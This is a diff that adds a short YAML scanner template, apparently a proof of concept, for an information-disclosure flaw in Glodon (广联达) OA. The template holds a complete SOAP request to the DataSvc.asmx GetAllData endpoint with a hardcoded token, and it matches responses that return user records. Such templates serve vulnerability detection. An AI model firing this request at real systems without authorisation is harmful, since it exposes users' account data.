@@ -1,0 +1,26 @@
+name: 广联达OA-DataSvc.asmx-敏感信息
+description: >-
+  信息泄露
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /WebService/Lk6SyncService/MrMMSSvc/DataSvc.asmx
+    headers:
+      Content-Type: text/xml
+      SOAPAction: http://tempuri.org/GetAllData
+    body: |
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <tem:GetAllData>
+                 <!--type: string-->
+                 <tem:Token>!@#$asdf$#@!</tem:Token>
+                 <!--type: string-->
+                 <tem:DataType>user</tem:DataType>
+              </tem:GetAllData>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    expression:
+      status: 200
+      body_all: ["<NewDataSet><Table><USR_ID>"]
